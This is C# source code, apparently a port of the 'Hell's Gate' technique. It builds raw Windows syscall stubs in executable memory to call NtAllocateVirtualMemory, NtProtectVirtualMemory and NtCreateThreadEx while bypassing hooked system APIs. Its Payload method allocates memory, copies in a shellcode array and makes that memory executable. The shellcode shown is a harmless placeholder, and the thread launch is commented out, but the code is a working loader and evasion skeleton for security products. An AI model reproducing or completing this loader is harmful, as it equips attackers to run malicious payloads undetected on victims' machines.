using System;
using System.Runtime.InteropServices;

namespace SharpHellsGate {
    public class HellsGate {

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(
          IntPtr lpAddress,
          int dwSize,
          uint flNewProtect,
          out uint lpflOldProtect
       );

        private byte[] GetHellsGate(byte high, byte low) {
            return new byte[] {
                0x4c, 0x8b, 0xd1,                                // mov  r10, rcx
                0xb8, low, high, 0x00, 0x00,                     // mov  eax, <syscall
                0xf6, 0x04, 0x25, 0x08, 0x03, 0xfe, 0x7f, 0x01,  // test byte ptr [SharedUserData+0x308],1
                0x75, 0x03,                                      // jne  ntdll!<function>+0x15
                0x0f, 0x05,                                      // syscall
                0xc3,                                            // ret
                0xcd, 0x2e,                                      // int  2Eh
                0xc3                                             // ret
            };
        }

        public VxTable Table { get; set; } = new VxTable();

        public HellsGate(VxTable Table) {
            this.Table = Table;
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtAllocateVirtualMemoryDelegate(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ulong ZeroBits,
            ref ulong RegionSize,
            ulong AllocationType,
            ulong Protect
        );

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtProtectVirtualMemoryDelegate(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref ulong NumberOfBytesToProtect,
            ulong NewAccessProtection,
            out ulong OldAccessProtection
        );

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtCreateThreadExDelegate(
            out IntPtr hThread,
            ulong DesiredAccess,
            IntPtr ObjectAttributes,
            IntPtr ProcessHandle,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            bool Flags,
            ulong StackZeroBits,
            ulong SizeOfStackCommit,
            ulong SizeOfStackReserve,
            out IntPtr lpBytesBuffer
        );

        private unsafe int NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ulong ZeroBits, ref ulong RegionSize, ulong AllocationType, ulong Protect) {
            byte[] gate = GetHellsGate(this.Table.NtAllocateVirtualMemory.High, this.Table.NtAllocateVirtualMemory.Low);
            fixed (byte* ptr = gate) {
                bool success = VirtualProtect((IntPtr)ptr, gate.Length, 0x40, out uint lpflOldProtect);
                if (!success)
                    return 0;

                NtAllocateVirtualMemoryDelegate Func = Marshal.GetDelegateForFunctionPointer<NtAllocateVirtualMemoryDelegate>((IntPtr)ptr);
                return Func(ProcessHandle, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);
            }
        }

        private unsafe int NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref ulong NumberOfBytesToProtect, ulong NewAccessProtection, ref ulong OldAccessProtection) {
            byte[] gate = GetHellsGate(this.Table.NtProtectVirtualMemory.High, this.Table.NtProtectVirtualMemory.Low);
            fixed (byte* ptr = gate) {
                bool success = VirtualProtect((IntPtr)ptr, gate.Length, 0x40, out uint lpflOldProtect);
                if (!success)
                    return 0;

                NtProtectVirtualMemoryDelegate Func = Marshal.GetDelegateForFunctionPointer<NtProtectVirtualMemoryDelegate>((IntPtr)ptr);
                return Func(ProcessHandle, ref BaseAddress, ref NumberOfBytesToProtect, NewAccessProtection, out OldAccessProtection);
            }
        }

        private unsafe int NtCreateThreadEx(ref IntPtr hThread, ulong DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, bool Flags, ulong StackZeroBits, ulong SizeOfStackCommit, ulong SizeOfStackReserve, ref IntPtr lpBytesBuffer) {
            byte[] gate = GetHellsGate(this.Table.NtCreateThreadEx.High, this.Table.NtCreateThreadEx.Low);
            fixed (byte* ptr = gate) {
                bool success = VirtualProtect((IntPtr)ptr, gate.Length, 0x40, out uint lpflOldProtect);
                if (!success)
                    return 0;

                NtCreateThreadExDelegate Func = Marshal.GetDelegateForFunctionPointer<NtCreateThreadExDelegate>((IntPtr)ptr);
                return Func(out hThread, DesiredAccess, ObjectAttributes, ProcessHandle, lpStartAddress, lpParameter, Flags, StackZeroBits, SizeOfStackCommit, SizeOfStackReserve, out lpBytesBuffer);
            }
        }

        public void Payload() {
            // Pointers
            IntPtr pBaseAddres = IntPtr.Zero;
            IntPtr pSelfProcess = new IntPtr(-1);

            // shellcode
            byte[] shellcode = new byte[] { 0x90, 0x90, 0x90, 0x90, 0xcc, 0xcc, 0xcc, 0xcc, 0xc3 };
            ulong Size = (ulong)shellcode.Length;

            // Flags
            ulong MEM_COMMIT = 0x00001000;
            ulong PAGE_READWRITE = 0x04;
            ulong PAGE_EXECUTE_READ = 0x20;


            // Allocate Memory
            int status = NtAllocateVirtualMemory(pSelfProcess, ref pBaseAddres, 0, ref Size, MEM_COMMIT, PAGE_READWRITE);
            if (status != 0x00)
                return;

            // Copy Memory
            Marshal.Copy(shellcode, 0, pBaseAddres, shellcode.Length);
            Array.Clear(shellcode, 0, shellcode.Length);

            // Change memory protection
            ulong OldAccessProtection = 0;
            status = NtProtectVirtualMemory(pSelfProcess, ref pBaseAddres, ref Size, PAGE_EXECUTE_READ, ref OldAccessProtection);
            if (status != 0x00)
                return;

            // Create thread
            //IntPtr hThread = IntPtr.Zero;
            //IntPtr lpBytesBuffer = IntPtr.Zero;
            //status = NtCreateThreadEx(ref hThread, 0x1FFFFF, IntPtr.Zero, pSelfProcess, pBaseAddres, IntPtr.Zero, false, 0, 0, 0, ref lpBytesBuffer);
            //HANDLE hHostThread = INVALID_HANDLE_VALUE;
            //HellsGate(pVxTable->NtCreateThreadEx.wSystemCall);
            //status = HellDescent(&hHostThread, 0x1FFFFF, NULL, (HANDLE) - 1, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
            ///

            Console.WriteLine(status);
        }
    }
}
